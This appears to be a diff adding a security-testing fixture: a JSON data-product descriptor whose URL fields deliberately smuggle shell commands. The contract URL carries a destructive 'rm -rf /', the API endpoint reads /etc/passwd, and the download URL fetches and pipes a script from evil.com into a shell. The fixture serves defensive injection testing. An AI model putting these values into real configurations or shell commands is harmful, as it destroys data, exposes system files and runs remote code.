@@ -1,0 +1,28 @@
+{
+  "schema": "https://opendataproducts.org/schema/v4.1",
+  "version": "4.1",
+  "product": {
+    "details": {
+      "en": {
+        "productID": "malicious-command-injection",
+        "name": "Command Injection Attack Attempt",
+        "description": "This file contains command injection attempts that could be exploited if values are used in shell commands."
+      }
+    },
+    "contract": {
+      "contractURL": "https://example.com/contract; rm -rf /"
+    },
+    "marketplace": {
+      "accessMethods": {
+        "api": {
+          "endpoint": "https://api.example.com/v1?param=$(cat /etc/passwd)"
+        },
+        "download": {
+          "url": "https://download.example.com/file; wget http://evil.com/steal.sh | sh"
+        }
+      }
+    }
+  },
+  "_security_note": "This file is intentionally malicious for security testing. It contains command injection patterns that could be exploited if values are used unsafely in shell commands."
+}
+
